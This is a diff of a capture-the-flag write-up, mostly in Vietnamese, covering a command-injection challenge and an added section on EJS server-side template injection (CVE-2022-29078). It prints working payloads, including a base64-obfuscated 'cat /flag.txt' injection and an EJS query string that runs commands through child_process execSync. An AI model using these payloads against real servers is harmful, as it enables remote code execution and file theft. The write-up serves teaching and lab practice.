@@ -9,7 +9,7 @@ tag: [web, crypto, forensic]
 
 ### Empty Execution
 
-#### Tổng quan 
+#### Overview
 
 Khi mở bài tập ta thấy website cho ta phần src code. Từ đây ta phân tích có đường dẫn `/run_command` nhận request `POST` để nhận một data dưới dạng `json`. Ngoài ra web cũng sẽ check xem đầu vào có chứa `..` hay `/` không.
 
@@ -42,7 +42,7 @@ Payload: {"command":". ;cat `echo 'L2ZsYWcudHh0'|base64 -d`; "}
 
 ### Nslookup
 
-#### Tổng quan 
+#### Overview
 
 Bài này hiển thị ra một trang web yêu cầu nhập domain. Khi nhập ta thấy nó sẽ thực hiện một lệnh `nslookup` tới một trang web. Cụ thể câu lệnh sẽ là `$ nslookup '{input}'`.
 
@@ -73,5 +73,55 @@ Dùng lệnh `dir /` để tìm file flag -> Payload để đọc file flag: `go
 #### Knowledge
 
 - OS command injection
+
+
+### EJS 3.1.8
+
+#### Overview
+
+Đề bài: The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command.
+
+Lướt qua trang web ta thấy không hề có gì đặc biệt. Dùng `dirsearch` hay thử một vài đường dẫn đặc biệt cũng ko thấy chúng tồn tại.
+
+![](../assets/Cookie%20Arena/img/Overview_EJS.png)
+
+Dựa vào đây ta search mạng thì thấy được 1 lỗi (CVE-2022-29078) có liên quan đến nó
+
+#### Ý tưởng
+
+Từ trang web thì ta có thể đoán được code nó như sau:
+
+``` js
+// index.js
+const express = require('express')
+const app = express()
+const port = 3000
+
+app.set('view engine', 'ejs');
+
+app.get('/', (req,res) => {
+    res.render('Welcome !', req.query);
+})
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`)
+})
+```
+
+Dựa vào https://eslam.io/posts/ejs-server-side-template-injection-rce/ ta tìm hiểu thêm về SSTI với ejs từ đó exploit để get flag.
+
+#### Get Flag
+
+Payload: `?settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');`
+
+#### Knowledge
+
+- SSTI
+
+- CVE-2022-29078
+
+#### Notes
+
+Never, never give users direct access to the EJS `render` function. EJS is effectively a JS runtime. Its entire purpose is to execute arbitrary strings of JS
 
 ## Crypto
